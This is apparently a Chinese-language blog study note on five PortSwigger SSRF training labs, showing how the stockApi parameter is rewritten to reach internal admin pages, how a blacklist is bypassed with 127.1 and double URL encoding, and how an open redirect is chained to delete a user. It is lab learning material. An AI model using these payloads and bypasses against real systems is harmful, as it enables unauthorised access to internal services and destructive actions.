---
title: PortSwigger-SSRF
date: 2026-03-25 16:38:37
tags:
  - SSRF
  - PortSwigger
categories:
  - 学习笔记
description: 记录了在 PortSwigger 靶场中完成基础 SSRF 漏洞实战的完整学习过程，包含了抓包分析与 payload 构造思路。
index_img: /img/heid.png
banner_img: /img/default.png
---
## Lab1: Basic SSRF against the local server
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325142213.png)
说库存检查功能有问题,去相关位置抓个包

![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325142520.png)
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325142635.png)
发到重放器,然后注意到有个stockApi,再发到编码区看看
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325142807.png)
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325142851.png)
根据题目，将stockApi参数中的URL更改为`http://localhost/admin`，这样就把URL交给服务端访问，服务端的localhost请求就来着本地，这样就进入了管理页面
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325143510.png)
可以看到出现删除carlos用户，查看这个删除按钮的代码
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325143725.png)
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325144019.png)
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325143927.png)
跟踪重定向成功完成


## Lab2: Basic SSRF against another back-end system
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325144244.png)
那么admin就在`192.168.0.X:8080/admin`，其中`X`不知道需要扫出来
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325144759.png)
解码查看
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325144844.png)
```
http://192.168.0.1:8080/product/stock/check?productId=5&storeId=1
```
改成
```
192.168.0.X:8080/admin
```
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325145030.png)
那爆破`X`，`Ctrl+I`发送到攻击器爆破
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325145249.png)
筛选一下可以看到120是响应200
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325145443.png)
进到管理页面找到删除功能
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325145556.png)
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325145639.png)
成功删除
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325145909.png)


## Lab3: Blind SSRF with out-of-band detection
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325150626.png)
随便点开一个页面抓包
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325150814.png)
发重发器，`Referer`按要求将原始域名替换为 Burp Collaborator 生成的域名
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325151025.png)
如果没有成功，等几秒钟再试一次，因为服务器端命令是异步执行的
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325151317.png)
这里可以看到访问信息
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325151617.png)


## Lab4: SSRF with blacklist-based input filter
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325151747.png)
还是库存检查功能问题，但有黑名单，先随便进一个网页抓包发到重发器
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325153038.png)
不出意外被过滤了
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325153252.png)
无疑是`localhost`或者`admin`被过滤了
`localhost`可以换成`127.0.0.1`,`127.1`
`admin`可以通过`URL`编码
```
stockApi=http://127.0.0.1/

stockApi=http://127.1/

stockApi=http://127.1/admin

URL编码一次
stockApi=http://127.1/%61%64%6d%69%6e

URL编码两次(成功)
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325153910.png)
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325154534.png)

最后，找到删除按钮的代码传过去
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325154702.png)
点一下重定向跟踪，完成实验
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325154747.png)


## Lab5: SSRF with filter bypass via open redirection vulnerability
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325160423.png)
先随便进一个网页抓包发到重发器
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325160601.png)
直接把api改成`http://192.168.0.12:8080/admin`肯定是不行的，只能从本地应用获取
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325160732.png)
从其他包找突破口，在每次点击下一页的时候发现都有一次重定向
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325161126.png)
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325161154.png)
发现这个包是GET传参，头部控制重定向地址，这个可以利用一下
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325161354.png)
让检查库存的api去访问这样一个地址,那这个地址对于网站来说肯定是属于内部，尝试看看
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325162037.png)
成功，注意要URL编码
那下面我们控制其中的参数，让其重定向地址到我们的`http://192.168.0.12:8080/admin`
```
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin

//URL编码
stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin
```
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325162355.png)
成功进入管理页面，最后找到删除`carlos`功能按钮代码，写入`stockApi`
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325162448.png)
```
stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos
```
![img](/img/PortSwigger-SSRF/Pasted%20image%2020260325162727.png)
